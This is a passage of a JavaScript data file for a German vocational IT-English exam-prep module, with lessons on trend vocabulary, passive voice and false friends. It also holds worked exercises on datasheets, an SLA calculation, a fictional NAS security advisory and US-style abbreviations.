      title: "Prozesse & Grafiken beschreiben",
      exam: ["AP1", "AP2"],
      summary: "Abläufe mit Sequencing-Wörtern und Passiv beschreiben, Diagrammarten benennen und Entwicklungen mit Trendvokabular, den richtigen Präpositionen und Prozentangaben darstellen.",
      html: `
        <p>Ob Incident-Prozess, DHCP-Ablauf oder Ticketstatistik: Prozesse und Grafiken beschreibst du nach festen Mustern. Das brauchst du für Präsentationen, Dokumentationen, Berichte an Kunden – und zum Verstehen englischer Fachtexte.</p>
        <h5>Abläufe beschreiben: Sequencing</h5>
        <table><thead><tr><th>Funktion</th><th>Wörter</th></tr></thead><tbody>
          <tr><td>Beginn</td><td>First (of all), To begin with, Initially</td></tr>
          <tr><td>Fortsetzung</td><td>Then, Next, After that, Afterwards, Subsequently</td></tr>
          <tr><td>Gleichzeitig / Bedingung</td><td>While …, Meanwhile, Once … / As soon as …, If …</td></tr>
          <tr><td>Ende</td><td>Finally, Lastly, In the end</td></tr>
        </tbody></table>
        <p>In <strong>Beschreibungen</strong> steht meist das <strong>Passiv</strong> (Wer es tut, ist unwichtig), in <strong>Anleitungen</strong> der <strong>Imperativ</strong>.</p>
        <div class="callout beispiel"><strong>Beispiel: DHCP-Ablauf (DORA) beschreiben</strong><br>First, the client sends a <em>DHCP Discover</em> message as a broadcast. Then, a DHCP server replies with an <em>Offer</em> that contains a free IP address. After that, the client requests this address with a <em>Request</em> message. Finally, the server confirms the lease with an <em>Acknowledge</em> message, and the address is assigned to the client.<br><em>Deutsch:</em> Der Client sucht per Broadcast einen DHCP-Server, erhält ein Angebot, fordert die Adresse an, und der Server bestätigt die Zuweisung.</div>
        <h5>Diagrammarten</h5>
        <p><strong>line graph/line chart</strong> (Liniendiagramm – Entwicklung über Zeit) · <strong>bar chart</strong> (Balken-/Säulendiagramm – Vergleich) · <strong>pie chart</strong> (Kreisdiagramm – Anteile) · <strong>table</strong> (Tabelle) · <strong>flowchart</strong> (Ablaufdiagramm) · <strong>Gantt chart</strong> · <strong>network diagram</strong> (Netzwerkplan; im Projektmanagement auch der Netzplan, genauer <em>PERT chart</em> bzw. <em>precedence diagram</em>). Teile: <em>x-axis</em> (horizontal), <em>y-axis</em> (vertikal), <em>legend</em>, <em>label</em>, <em>scale</em>, <em>segment</em>.</p>
        <h5>Trendvokabular</h5>
        <table><thead><tr><th>Richtung</th><th>Verben</th><th>Nomen</th></tr></thead><tbody>
          <tr><td>nach oben</td><td>rise (rose, risen), increase, grow, go up, climb; stark: soar, rocket</td><td>a rise, an increase, growth</td></tr>
          <tr><td>nach unten</td><td>fall (fell, fallen), decrease, decline, drop, go down; stark: plummet</td><td>a fall, a decrease, a decline, a drop</td></tr>
          <tr><td>gleich</td><td>remain stable, stay the same, level off, plateau</td><td>a plateau</td></tr>
          <tr><td>Hoch- / Tiefpunkt</td><td>peak at, reach a peak of / hit a low of</td><td>a peak, a low</td></tr>
          <tr><td>schwankend</td><td>fluctuate</td><td>a fluctuation</td></tr>
        </tbody></table>
        <p><strong>Wie stark?</strong> sharply, dramatically, significantly (stark) · steadily, gradually (stetig, allmählich) · slightly (leicht).</p>
        <h5>Präpositionen – hier passieren die meisten Fehler</h5>
        <ul>
          <li><strong>from … to …</strong>: Start- und Endwert – rose <em>from</em> 420 <em>to</em> 460.</li>
          <li><strong>by</strong>: Differenz – rose <em>by</em> 40 tickets.</li>
          <li><strong>at</strong>: Stand – remained stable <em>at</em> 380.</li>
          <li><strong>of</strong> nach Nomen: an increase <em>of</em> 40 tickets, a peak <em>of</em> 610.</li>
        </ul>
        <div class="callout formel"><strong>Formel: prozentuale Veränderung</strong><br>Veränderung in % = (neuer Wert − alter Wert) ÷ alter Wert × 100</div>
        <div class="callout beispiel"><strong>Beispiel: Ticketstatistik beschreiben</strong><br>Tickets pro Monat: January 420 · February 460 · March 610 · April 380<br>Rechnung: Feb: (460 − 420) ÷ 420 × 100 ≈ +9,5 % · Mar: (610 − 460) ÷ 460 × 100 ≈ +32,6 % · Apr: (380 − 610) ÷ 610 × 100 ≈ −37,7 %<br><em>Text:</em> The line graph shows the number of service desk tickets from January to April. The number rose slightly from 420 in January to 460 in February, an increase of about 9.5 %. It then climbed sharply by 150 and peaked at 610 in March, probably because of the Windows migration. In April, it fell dramatically to 380, a drop of about 37.7 %.</div>
        <div class="callout achtung"><strong>Prüfungsfalle:</strong> <em>Prozent</em> ≠ <em>Prozentpunkte</em>. Steigt die Verfügbarkeit von 98 % auf 99 %, ist das ein Plus von 1 <strong>percentage point</strong>, aber etwa 1,02 % relativ. Und im Englischen steht ein Punkt als Dezimaltrennzeichen: 9.5 %.</div>
        <div class="callout pruefung"><strong>So kommt es in der Prüfung dran:</strong> In der IHK-Prüfung musst du Diagramme und Tabellen auswerten und Veränderungen berechnen (z. B. Ticketzahlen, Energieverbrauch, Kosten) – meist auf Deutsch. In der Berufsschule beschreibst du Grafiken und Prozesse schriftlich oder in einer Präsentation auf Englisch.</div>
      `
    },
    {
      id: "grammatik-false-friends",
      title: "Grammatik fürs Technik-Englisch & False Friends",
      exam: ["AP1", "AP2"],
      summary: "Passiv, Imperativ, if-Sätze, Modalverben und die richtigen Zeiten für Tickets – plus die False Friends, die in IT-Texten am häufigsten zu Fehlern führen.",
      html: `
        <p>Technische Texte nutzen nur wenige Grammatikstrukturen – die aber ständig. Wer sie erkennt, versteht Handbücher schneller und schreibt korrekte Tickets und E-Mails.</p>
        <h5>Passiv: be + past participle (3. Form)</h5>
        <table><thead><tr><th>Zeit</th><th>Beispiel</th><th>Typischer Einsatz</th></tr></thead><tbody>
          <tr><td>Present</td><td>The data <strong>is encrypted</strong> with AES.</td><td>Prozessbeschreibung, Datenblatt</td></tr>
          <tr><td>Past</td><td>The server <strong>was restarted</strong> at 6 p.m.</td><td>Bericht, Logbuch</td></tr>
          <tr><td>Present perfect</td><td>The printer <strong>has been replaced</strong>.</td><td>Ticket-Update: Ergebnis ist jetzt wichtig</td></tr>
          <tr><td>Future</td><td>The update <strong>will be installed</strong> tonight.</td><td>Ankündigung</td></tr>
          <tr><td>mit Modalverb</td><td>The cable <strong>must be replaced</strong>. / It <strong>can be configured</strong> via the web interface.</td><td>Handbuch, Empfehlung</td></tr>
        </tbody></table>
        <p>Unregelmäßige Verben, die in IT-Texten oft vorkommen: set – set – set · run – ran – run · send – sent – sent · write – wrote – written · choose – chose – chosen · shut – shut – shut · find – found – found · break – broke – broken.</p>
        <h5>Imperativ in Anleitungen</h5>
        <p>Grundform ohne Subjekt: <em>Press and hold the reset button for 10 seconds.</em> · Verneint: <em>Do not / Don't disconnect the power during the update.</em> · Verstärkt: <em>Make sure that …</em> / <em>Never …</em></p>
        <h5>if-Sätze (conditionals)</h5>
        <table><thead><tr><th>Typ</th><th>Form</th><th>Beispiel</th></tr></thead><tbody>
          <tr><td>0 – immer gültig</td><td>if + present, present</td><td>If the LED flashes red, the disk is defective.</td></tr>
          <tr><td>1 – real möglich</td><td>if + present, will + Grundform</td><td>If you restart the router, the connection will drop for two minutes.</td></tr>
          <tr><td>2 – gedacht</td><td>if + past, would + Grundform</td><td>If we had a second switch, we would have redundancy.</td></tr>
          <tr><td>3 – Vergangenheit, zu spät</td><td>if + past perfect, would have + 3. Form</td><td>If we had tested the backup, we would have noticed the error.</td></tr>
        </tbody></table>
        <h5>Modalverben und Zeiten</h5>
        <ul>
          <li><strong>must</strong> = müssen · <strong>must not / mustn't</strong> = <strong>nicht dürfen</strong> · <strong>don't have to / needn't</strong> = nicht müssen · <strong>should</strong> = sollte.</li>
          <li><strong>Present perfect</strong> für Ergebnisse ohne Zeitangabe: <em>I have restarted the server – it works now.</em> <strong>Simple past</strong> mit Zeitangabe: <em>I restarted the server yesterday at 5 p.m.</em></li>
          <li><strong>since</strong> + Zeitpunkt (<em>since Monday</em>), <strong>for</strong> + Zeitraum (<em>for three days</em>): <em>The error has occurred since the update.</em></li>
        </ul>
        <h5>False Friends</h5>
        <table><thead><tr><th>Englisch</th><th>bedeutet</th><th>nicht</th><th>richtig für das deutsche Wort</th></tr></thead><tbody>
          <tr><td>become</td><td>werden</td><td>bekommen</td><td>get, receive</td></tr>
          <tr><td>eventually</td><td>schließlich</td><td>eventuell</td><td>possibly, perhaps</td></tr>
          <tr><td>actual</td><td>tatsächlich</td><td>aktuell</td><td>current, up-to-date</td></tr>
          <tr><td>sensible</td><td>vernünftig</td><td>sensibel</td><td>sensitive</td></tr>
          <tr><td>to control</td><td>steuern</td><td>kontrollieren</td><td>to check</td></tr>
          <tr><td>handy</td><td>praktisch</td><td>Handy</td><td>mobile phone, cell phone</td></tr>
          <tr><td>chef</td><td>Koch</td><td>Chef</td><td>boss, manager</td></tr>
          <tr><td>billion</td><td>Milliarde</td><td>Billion</td><td>trillion</td></tr>
          <tr><td>provision</td><td>Bereitstellung</td><td>Provision</td><td>commission</td></tr>
          <tr><td>also</td><td>auch</td><td>also (daher)</td><td>so, therefore</td></tr>
          <tr><td>map</td><td>Landkarte, Plan; <em>to map</em> = zuordnen</td><td>Mappe</td><td>folder</td></tr>
          <tr><td>consequent</td><td>daraus folgend</td><td>konsequent</td><td>consistent(ly)</td></tr>
          <tr><td>concern</td><td>Anliegen, Sorge</td><td>Konzern</td><td>group (of companies), corporation</td></tr>
          <tr><td>prospect</td><td>Aussicht, möglicher Kunde</td><td>Prospekt</td><td>brochure, leaflet</td></tr>
          <tr><td>notice</td><td>Hinweis, Aushang, Kündigung(sfrist)</td><td>Notiz</td><td>note</td></tr>
        </tbody></table>
        <p>Scheinanglizismen: <em>Beamer</em> = projector · <em>Homeoffice</em> = working from home, remote work · <em>Platine</em> = circuit board (PCB).</p>
        <div class="callout achtung"><strong>Prüfungsfalle:</strong> „You <strong>must not</strong> open the case“ heißt „Du <strong>darfst</strong> das Gehäuse <strong>nicht</strong> öffnen“ – nicht „musst nicht“. Und im if-Teil steht nie <em>will</em>: „If you will click …“ ist falsch, richtig ist „If you click …“.</div>
        <div class="callout pruefung"><strong>So kommt es in der Prüfung dran:</strong> Grammatik wird in der IHK-Prüfung nicht abgefragt, entscheidet aber, ob du Handbuchsätze richtig verstehst (Passiv, <em>must not</em>, if-Sätze). In Klassenarbeiten der Berufsschule: Sätze ins Passiv setzen, if-Sätze ergänzen, False Friends korrigieren.</div>
      `
    },
  ],
  exercises: [
    {
      id: "e-lesen-1",
      topic: "pruefung-lesen",
      title: "Englischer Fachtext zu Change Management",
      level: 2,
      exam: ["AP1"],
      task: `<p>Die Nordlicht IT GmbH in Heide führt für die Stadtwerke Husum ein neues Ticketsystem mit einem KI-Chatbot für den 1st-Level-Support ein. Ein Teil des Service-Desk-Teams der Stadtwerke ist skeptisch. Die Projektleitung verteilt folgenden Auszug aus einem englischen Fachartikel:</p>
        <p><em>„Why change projects fail. Most IT change projects do not fail because of technology. They fail because people do not accept the new way of working. Employees often fear that they will lose control, status or even their jobs. Managers sometimes announce a change without explaining the reasons behind it.<br>Successful organisations start by explaining why the change is needed. They involve key users early, for example as testers or ‘change champions’ who support their colleagues. They offer training before the go-live date, not afterwards. Finally, they collect feedback regularly and adapt the plan if necessary. Resistance should be seen as useful information, not as an attack.“</em></p>
        <p>a) Gib die Kernaussage des ersten Absatzes auf Deutsch wieder. (2 Punkte)</p>
        <p>b) Nenne vier Maßnahmen, die der Text für erfolgreiche Veränderungsprojekte empfiehlt. Antworte auf Deutsch. (4 Punkte)</p>
        <p>c) Erkläre den Begriff „change champions“ im Zusammenhang des Textes. (2 Punkte)</p>
        <p>d) Übertrage zwei Empfehlungen des Textes konkret auf die Chatbot-Einführung bei den Stadtwerken. (2 Punkte)</p>`,
      hints: ["Lies zuerst die Fragen, dann scanne den Text nach Verben wie explain, involve, offer, collect.", "Antworte auf Deutsch und in ganzen Sätzen – nicht Wort für Wort übersetzen."],
      solution: `<p><strong>a)</strong> IT-Veränderungsprojekte scheitern selten an der Technik, sondern meist daran, dass die Beschäftigten die neue Arbeitsweise nicht annehmen. Ursachen sind Ängste vor Kontroll-, Status- oder Arbeitsplatzverlust und Führungskräfte, die Änderungen ankündigen, ohne die Gründe zu erklären.</p>
        <p><strong>b)</strong> (1) Zu Beginn erklären, warum die Veränderung notwendig ist. (2) Wichtige Anwender früh einbinden, z. B. als Tester oder Multiplikatoren. (3) Schulungen vor dem Starttermin (go-live) anbieten, nicht erst danach. (4) Regelmäßig Rückmeldungen einholen und den Plan bei Bedarf anpassen. (Ebenfalls richtig: Widerstand als nützliche Information betrachten statt als Angriff.)</p>
        <p><strong>c)</strong> „Change champions“ sind Beschäftigte, die früh in das Projekt eingebunden werden, die Neuerung unterstützen und ihren Kolleginnen und Kollegen helfen. Sie wirken als Multiplikatoren bzw. Promotoren des Wandels und senken die Hemmschwelle, weil sie aus dem eigenen Team kommen.</p>
        <p><strong>d)</strong> Beispiel 1: Die Projektleitung erklärt dem Service-Desk-Team, dass der Chatbot Standardanfragen wie Passwort-Resets übernimmt, damit das Team mehr Zeit für schwierige Fälle hat – und dass niemand entlassen wird. Beispiel 2: Zwei erfahrene Service-Desk-Mitarbeitende testen den Chatbot vor dem Start, geben Feedback zu den Antworten und schulen danach ihre Kolleginnen und Kollegen.</p>`
    },
    {
      id: "e-hw-1",
      topic: "vokabeln-hardware",
      title: "Monitor-Datenblatt für eine Steuerkanzlei auswerten",
      level: 2,
      exam: ["AP1"],
      task: `<p>Die Nordlicht IT GmbH in Heide stattet eine Steuerkanzlei in Husum mit 12 neuen Monitoren aus. Im Belegsatz liegt folgender Auszug aus dem englischen Datenblatt:</p>
        <pre><code>Model NV-27Q
Screen size:      27" IPS, anti-glare
Resolution:       2560 x 1440 @ 75 Hz
Ergonomics:       height-adjustable (130 mm), tilt, swivel, pivot;
                  flicker-free, low blue light mode
Connectivity:     1x HDMI 2.0, 1x DisplayPort 1.4 in,
                  1x DisplayPort out (MST daisy chaining),
                  1x USB-C (DP Alt Mode, 65 W power delivery),
                  3x USB-A 3.2 hub
Power consumption: typical 18 W, max. 110 W (incl. USB-C charging),
                  standby 0.3 W
Warranty:         3 years, advance replacement</code></pre>
        <p>a) Erkläre auf Deutsch die Begriffe <em>anti-glare</em>, <em>pivot</em>, <em>flicker-free</em>, <em>daisy chaining</em>, <em>65 W power delivery</em> und <em>advance replacement</em>. (6 Punkte)</p>
        <p>b) Berechne die jährlichen Stromkosten aller 12 Monitore. Betrieb: 8 Stunden an 220 Tagen, Strompreis 0,30 €/kWh. Begründe, welchen Leistungswert du verwendest. (4 Punkte)</p>
        <p>c) Die Kanzlei nutzt Notebooks. Erläutere zwei Vorteile des USB-C-Anschlusses für diese Arbeitsplätze. (2 Punkte)</p>`,
      hints: ["Für Stromkosten: typischer Wert; für die Dimensionierung (Netzteil, USV): Maximalwert.", "W = P × t; Kosten = kWh × Preis"],
      solution: `<p><strong>a)</strong></p>
        <ul>
          <li><strong>anti-glare:</strong> entspiegelte (matte) Oberfläche – weniger Reflexionen, ergonomisch wichtig.</li>
          <li><strong>pivot:</strong> Der Bildschirm lässt sich um 90° ins Hochformat drehen, z. B. für lange Dokumente.</li>
          <li><strong>flicker-free:</strong> flimmerfrei – die Helligkeit wird ohne Flackern der Hintergrundbeleuchtung geregelt (kein PWM-Flimmern), das schont die Augen.</li>
          <li><strong>daisy chaining:</strong> Reihenschaltung – ein zweiter Monitor wird am DisplayPort-Ausgang dieses Monitors angeschlossen statt direkt am Rechner (per MST).</li>
          <li><strong>65 W power delivery:</strong> Über das USB-C-Kabel kann das Notebook mit bis zu 65 W geladen werden.</li>
          <li><strong>advance replacement:</strong> Vorabaustausch – bei einem Defekt schickt der Hersteller zuerst ein Ersatzgerät, das defekte Gerät wird danach zurückgeschickt.</li>
        </ul>
        <p><strong>b)</strong> Für die Stromkosten im Normalbetrieb nimmt man die <strong>typische</strong> Leistungsaufnahme (18 W). Der Maximalwert (110 W) enthält die bis zu 65 W, mit denen gleichzeitig ein Notebook über USB-C geladen wird, und gilt nur bei voller Helligkeit und belastetem USB-Hub – er dient zur Dimensionierung (z. B. USV), nicht zur Kostenrechnung.</p>
        <p>Betriebsstunden: 8 h × 220 = 1.760 h<br>Energie je Monitor: 18 W × 1.760 h = 31.680 Wh = 31,68 kWh<br>Energie gesamt: 31,68 kWh × 12 = 380,16 kWh<br>Kosten: 380,16 kWh × 0,30 €/kWh = <strong>114,05 € pro Jahr</strong> (ohne Standby)</p>
        <p><strong>c)</strong> (1) Ein einziges Kabel überträgt Bild, USB-Daten (Hub für Tastatur und Maus) und Strom – das Notebook wird gleichzeitig geladen, ein separates Netzteil am Platz entfällt. (2) Der Arbeitsplatz ist schnell gewechselt (Desk-Sharing): Kabel einstecken, und Monitor, Peripherie und Stromversorgung sind sofort verbunden. Das spart eine Dockingstation.</p>`
    },
    {
      id: "e-netsec-1",
      topic: "vokabeln-netzwerk-security",
      title: "Security Advisory eines NAS-Herstellers",
      level: 2,
      exam: ["AP1", "AP2"],
      task: `<p>Die Nordlicht IT GmbH betreut die Fischerei Büsum GmbH. Dort läuft ein NAS mit StorLine OS 5.2.1. Die Weboberfläche des NAS ist per Portweiterleitung aus dem Internet erreichbar, damit der Geschäftsführer von unterwegs zugreifen kann. Heute kommt folgende E-Mail:</p>
        <p><em>Subject: Security Advisory SL-2026-07 – Critical vulnerability in StorLine OS<br>Dear customer,<br>a critical vulnerability has been discovered in StorLine OS versions 5.0 to 5.2.3. It allows a remote attacker to gain administrator access without authentication if the web interface is reachable from the internet. We are not aware of any active exploitation at this time.<br>Affected: 5.0 – 5.2.3 · Not affected: 5.2.4 and later, 4.x<br>Recommended action: Update to version 5.2.4 immediately. If you cannot update right away, disable remote access to the web interface as a temporary workaround. After the update, check the user list for unknown administrator accounts.<br>Kind regards,<br>StorLine Product Security Team</em></p>
        <p>a) Fasse das Problem in zwei Sätzen auf Deutsch zusammen. (2 Punkte)</p>
        <p>b) Prüfe, ob das NAS der Fischerei betroffen ist, und begründe. (2 Punkte)</p>
        <p>c) Nenne die empfohlenen Maßnahmen in einer sinnvollen Reihenfolge. (3 Punkte)</p>
        <p>d) Übersetze: <em>vulnerability</em>, <em>remote attacker</em>, <em>without authentication</em>, <em>active exploitation</em>, <em>workaround</em>. (5 Punkte)</p>
        <p>e) Erläutere, welche Schutzziele bei einem erfolgreichen Angriff verletzt würden. (3 Punkte)</p>`,
      solution: `<p><strong>a)</strong> In StorLine OS 5.0 bis 5.2.3 gibt es eine kritische Sicherheitslücke, über die ein Angreifer aus dem Internet ohne Anmeldung Administratorrechte erlangen kann, sofern die Weboberfläche aus dem Internet erreichbar ist. Dem Hersteller sind bisher keine aktiven Angriffe über diese Lücke bekannt; ein Update auf 5.2.4 steht bereit.</p>
        <p><strong>b)</strong> Ja. Version 5.2.1 liegt im betroffenen Bereich 5.0–5.2.3, und die Weboberfläche ist per Portweiterleitung aus dem Internet erreichbar – genau die Bedingung, unter der die Lücke ausnutzbar ist.</p>
        <p><strong>c)</strong> (1) Sofort die Portweiterleitung deaktivieren, falls das Update nicht direkt möglich ist (Workaround). (2) Update auf StorLine OS 5.2.4 oder neuer einspielen (vorher Datensicherung prüfen). (3) Nach dem Update die Benutzerliste auf unbekannte Administratorkonten prüfen. Zusätzlich sinnvoll: Fernzugriff künftig nur per VPN statt Portweiterleitung.</p>
        <p><strong>d)</strong> vulnerability = Schwachstelle/Sicherheitslücke · remote attacker = entfernter Angreifer (über das Netz, nicht vor Ort) · without authentication = ohne Anmeldung/Authentifizierung · active exploitation = aktive Ausnutzung (Angriffe finden bereits statt) · workaround = Übergangslösung/Umgehungslösung.</p>
        <p><strong>e)</strong> Mit Administratorrechten könnte ein Angreifer Daten lesen und abziehen (<strong>Vertraulichkeit</strong>), Daten verändern oder Konten manipulieren (<strong>Integrität</strong>) sowie Daten löschen oder verschlüsseln, z. B. mit Ransomware (<strong>Verfügbarkeit</strong>). Betroffen wären also alle drei Schutzziele.</p>`
    },
    {
      id: "e-cloud-1",
      topic: "vokabeln-software-cloud",
      title: "SaaS-Angebot mit SLA auswerten",
      level: 3,
      exam: ["AP1", "AP2"],
      task: `<p>Die Nordlicht IT GmbH prüft für ihr eigenes Service-Desk-Team (8 Agenten) ein Cloud-Ticketsystem. Aus dem englischen Angebot:</p>
        <pre><code>HelpFlow Cloud – Business plan
- EUR 19 per agent per month, billed annually
- Add-on AI assistant: pay-as-you-go, EUR 0.02 per resolved conversation
- Data residency: EU (Frankfurt, Dublin), dedicated tenant
- Uptime SLA: 99.9 % per calendar month, excluding scheduled
  maintenance (announced 72 hours in advance)
- Service credits: 10 % of the monthly fee if uptime falls below
  99.9 %, 25 % if uptime falls below 99.0 %
- Data export: full export in CSV and JSON at any time</code></pre>
        <p>a) Erkläre auf Deutsch: <em>billed annually</em>, <em>pay-as-you-go</em>, <em>data residency</em>, <em>dedicated tenant</em>, <em>scheduled maintenance</em>. (5 Punkte)</p>
        <p>b) Berechne die zulässige ungeplante Ausfallzeit im Oktober (31 Tage) in Minuten. (2 Punkte)</p>
        <p>c) Im Oktober fiel der Dienst ungeplant 3 Stunden aus. Berechne die Verfügbarkeit (zwei Nachkommastellen) und die Gutschrift. (4 Punkte)</p>
        <p>d) Erläutere, warum der Punkt „Data export“ im Hinblick auf <em>vendor lock-in</em> wichtig ist. (2 Punkte)</p>`,
      hints: ["Ausfallzeit = (1 − Verfügbarkeit) × Zeitraum", "Monatsgebühr = Anzahl Agenten × Preis pro Agent"],
      solution: `<p><strong>a)</strong> <em>billed annually</em>: Der Preis wird pro Monat angegeben, aber für ein ganzes Jahr im Voraus abgerechnet. <em>pay-as-you-go</em>: nutzungsabhängige Abrechnung – bezahlt wird nur, was tatsächlich genutzt wird (hier 0,02 € pro gelöster Konversation). <em>data residency</em>: Speicherort der Daten – hier Rechenzentren in der EU (Frankfurt, Dublin), was die DSGVO-Konformität erleichtert. <em>dedicated tenant</em>: eigener, von anderen Kunden abgegrenzter Mandant in der Cloud. <em>scheduled maintenance</em>: geplante Wartung; sie wird 72 Stunden vorher angekündigt und zählt nicht als Ausfall im Sinne des SLA.</p>
        <p><strong>b)</strong> Oktober: 31 × 24 × 60 min = 44.640 min<br>Zulässige Ausfallzeit = (1 − 0,999) × 44.640 min = 0,001 × 44.640 min = <strong>44,64 min</strong></p>
        <p><strong>c)</strong> Ausfall: 3 h = 180 min<br>Verfügbarkeit = (44.640 − 180) ÷ 44.640 × 100 = 44.460 ÷ 44.640 × 100 ≈ <strong>99,60 %</strong><br>99,60 % liegt unter 99,9 %, aber über 99,0 % → Gutschrift 10 %.<br>Monatsgebühr: 8 × 19 € = 152 € → Gutschrift = 0,10 × 152 € = <strong>15,20 €</strong></p>
        <p><strong>d)</strong> Vendor lock-in bedeutet, dass ein Kunde so stark von einem Anbieter abhängig ist, dass ein Wechsel sehr teuer oder aufwendig wird. Weil alle Daten jederzeit vollständig in offenen Formaten (CSV, JSON) exportiert werden können, lassen sie sich zu einem anderen Anbieter oder in ein eigenes System übernehmen. Das senkt die Abhängigkeit und stärkt die Verhandlungsposition.</p>`
    },
    {
      id: "e-hw-2",
      topic: "vokabeln-hardware",
      title: "Handbuchauszug: Daisy Chaining mit DisplayPort MST",
      level: 3,
      exam: ["AP1"],
      task: `<p>Für die Buchhaltung der Westküsten-Werkstätten in Meldorf sollen je zwei Monitore pro Arbeitsplatz mit möglichst wenig Kabeln angeschlossen werden. Aus dem englischen Handbuch des Monitors:</p>
        <p><em>„Daisy chaining (DisplayPort 1.4 MST): Connect the first monitor to the DisplayPort or USB-C output of your computer. Then connect the DP OUT port of the first monitor to the DP IN port of the second monitor. Multi-Stream Transport (MST) must be enabled in the on-screen display (OSD) menu of the first monitor. The last monitor in the chain does not need a DP OUT port. Note: The graphics card must support MST. macOS does not support MST for an extended desktop – all monitors will show the same image.“</em></p>
        <p>a) Erkläre auf Deutsch, was mit <em>daisy chaining</em> gemeint ist. (2 Punkte)</p>
        <p>b) Nenne drei Voraussetzungen, die laut Text erfüllt sein müssen. (3 Punkte)</p>
        <p>c) Eine Mitarbeiterin arbeitet mit einem MacBook. Beschreibe, was bei ihr passiert, und nenne eine Alternative. (2 Punkte)</p>
        <p>d) Nenne einen Vorteil und einen Nachteil des Daisy Chaining gegenüber dem direkten Anschluss beider Monitore. (2 Punkte)</p>`,
      solution: `<p><strong>a)</strong> Daisy Chaining ist eine Reihenschaltung: Nur der erste Monitor wird direkt mit dem Computer verbunden, der zweite Monitor hängt am Ausgang (DP OUT) des ersten. Das Bildsignal für beide Monitore läuft über ein einziges Kabel vom Rechner.</p>
        <p><strong>b)</strong> (1) Die Grafikkarte bzw. der Grafikausgang muss MST unterstützen. (2) Der erste Monitor braucht einen DisplayPort-Ausgang (DP OUT). (3) MST muss im Bildschirmmenü (OSD) des ersten Monitors eingeschaltet sein. (Außerdem: Anschluss über DisplayPort oder USB-C mit DisplayPort-Signal.)</p>
        <p><strong>c)</strong> macOS unterstützt MST nicht für einen erweiterten Desktop. Beide Monitore zeigen deshalb dasselbe Bild (Spiegelung). Alternative: Beide Monitore einzeln anschließen, z. B. über zwei USB-C/Thunderbolt-Anschlüsse oder eine Dockingstation, die mehrere Monitore am Mac unterstützt.</p>
        <p><strong>d)</strong> Vorteil: weniger Kabel zum Rechner und nur ein belegter Grafikanschluss – gut für Notebooks mit wenigen Anschlüssen. Nachteil: Alle Monitore teilen sich die Bandbreite der ersten Verbindung (Auflösung/Bildwiederholrate begrenzt), und fällt der erste Monitor aus, ist auch der zweite ohne Bild.</p>`
    },
    {
      id: "e-abk-1",
      topic: "abkuerzungen",
      title: "E-Mail eines US-Distributors entschlüsseln",
      level: 1,
      exam: ["AP1"],
      task: `<p>Jonas, Auszubildender bei der Nordlicht IT GmbH, erhält folgende E-Mail eines Distributors aus den USA:</p>
        <p><em>„Hi Jonas, FYI – the 24" monitors from your PO 5521 are on backorder. ETA is 10/09/2026. The docking stations w/o power adapters are ready to ship. Price: USD 1,249.50 excl. VAT, i.e. VAT will be added on the invoice. For the defective unit, please use RMA no. 88213. The delivery date for the keyboards is still TBD. Please confirm by EOD Friday. Best, Karen“</em></p>
        <p>Im Datenblatt der Dockingstation steht außerdem: <em>„Operating temperature: 50 °F to 95 °F“</em>.</p>
        <p>a) Erkläre die Abkürzungen FYI, PO, ETA, w/o, excl. VAT, i.e., RMA, TBD und EOD. (4,5 Punkte)</p>
        <p>b) An welchem Datum sollen die Monitore voraussichtlich ankommen? Begründe. (1 Punkt)</p>
        <p>c) Schreibe den Preis in deutscher Schreibweise. (0,5 Punkte)</p>
        <p>d) Berechne die Bildschirmdiagonale der Monitore in cm. (1 Punkt)</p>
        <p>e) Rechne den Temperaturbereich in °C um. (2 Punkte)</p>`,
      hints: ["US-Datumsformat: Monat/Tag/Jahr", "°C = (°F − 32) × 5/9; 1 inch = 2,54 cm"],
      solution: `<p><strong>a)</strong> FYI = for your information (zur Kenntnisnahme) · PO = purchase order (Bestellung, Bestellnummer) · ETA = estimated time of arrival (voraussichtliche Ankunft/Lieferung) · w/o = without (ohne) · excl. VAT = excluding value added tax (ohne Mehrwertsteuer) · i.e. = id est/that is (das heißt) · RMA = return merchandise authorization (Rücksendenummer für den Austausch/die Reparatur) · TBD = to be determined (noch offen, wird noch festgelegt) · EOD = end of day (bis Arbeitsende).</p>
        <p><strong>b)</strong> Die Mail stammt aus den USA (Preis in USD), dort gilt das Format Monat/Tag/Jahr: 10/09/2026 = <strong>9. Oktober 2026</strong> (ein Freitag) – nicht 10. September.</p>
        <p><strong>c)</strong> <strong>1.249,50 USD</strong> (zzgl. MwSt.)</p>
        <p><strong>d)</strong> 24 × 2,54 cm = <strong>60,96 cm</strong></p>
        <p><strong>e)</strong> 50 °F: (50 − 32) × 5/9 = 18 × 5/9 = <strong>10 °C</strong><br>95 °F: (95 − 32) × 5/9 = 63 × 5/9 = <strong>35 °C</strong><br>Die Dockingstation darf also zwischen 10 °C und 35 °C betrieben werden.</p>`
    },
    {
      id: "e-doc-1",
      topic: "datenblatt-manual",
      title: "Außenkamera: englisches Datenblatt, PoE und Speicherbedarf",
      level: 3,
      exam: ["AP1"],
      task: `<p>Der Landhandel Dithmarschen eG in Meldorf lässt das Außenlager mit IP-Kameras überwachen. Die Nordlicht IT GmbH soll prüfen, ob folgendes Modell passt:</p>
        <pre><code>NLC-4 Outdoor Bullet Camera
Image sensor:        4 MP, H.265
IR range:            up to 40 m
Heater:              built-in, activates below 0 °C
Operating temp.:     -40 °C to +60 °C
Power:               PoE IEEE 802.3at (Class 4) or 12 V DC
Max. power consump.: 19 W (heater on), 7 W (heater off)
Ingress protection:  IP67
Bitrate:             6 Mbit/s (constant bitrate)</code></pre>
        <p>a) Erkläre auf Deutsch die Angaben <em>IR range up to 40 m</em>, <em>heater activates below 0 °C</em> und <em>IP67</em>. (3 Punkte)</p>
        <p>b) Der vorhandene Switch unterstützt nur PoE nach IEEE 802.3af. Beurteile, ob die Kamera daran ganzjährig betrieben werden kann. (3 Punkte)</p>
        <p>c) Berechne die Stromstärke bei maximaler Leistungsaufnahme und 48 V in mA. (2 Punkte)</p>
        <p>d) Ein neuer PoE+-Switch hat ein PoE-Budget von 120 W und reserviert für jeden Class-4-Port 30 W. Wie viele Kameras können sicher versorgt werden? (2 Punkte)</p>
        <p>e) Berechne den Speicherbedarf für diese Anzahl Kameras bei 14 Tagen Aufbewahrung in GiB und TiB. (4 Punkte)</p>`,
      hints: ["802.3af: 12,95 W am Endgerät; 802.3at: 25,5 W am Endgerät", "Datenrate dezimal (1 Mbit/s = 10⁶ bit/s), Datenmenge binär (1 GiB = 2³⁰ Byte)"],
